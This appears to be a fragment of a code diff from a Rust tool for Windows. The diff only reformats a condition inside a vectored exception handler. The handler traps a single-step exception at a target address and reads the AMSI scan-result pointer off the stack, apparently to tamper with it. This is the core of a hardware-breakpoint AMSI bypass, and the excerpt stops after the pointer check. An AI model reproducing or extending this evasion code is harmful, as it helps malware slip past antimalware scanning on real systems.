@@ -48,7 +48,9 @@ unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -
         let record = &*(*exception_info).ExceptionRecord;
         let context = &mut *(*exception_info).ContextRecord;
 
-        if record.ExceptionCode == EXCEPTION_SINGLE_STEP && record.ExceptionAddress as usize == TARGET_ADDR {
+        if record.ExceptionCode == EXCEPTION_SINGLE_STEP
+            && record.ExceptionAddress as usize == TARGET_ADDR
+        {
             let amsi_result_ptr_addr = context.Rsp + 0x30;
             let amsi_result_ptr = *(amsi_result_ptr_addr as *const *mut u32);
             if !amsi_result_ptr.is_null() {
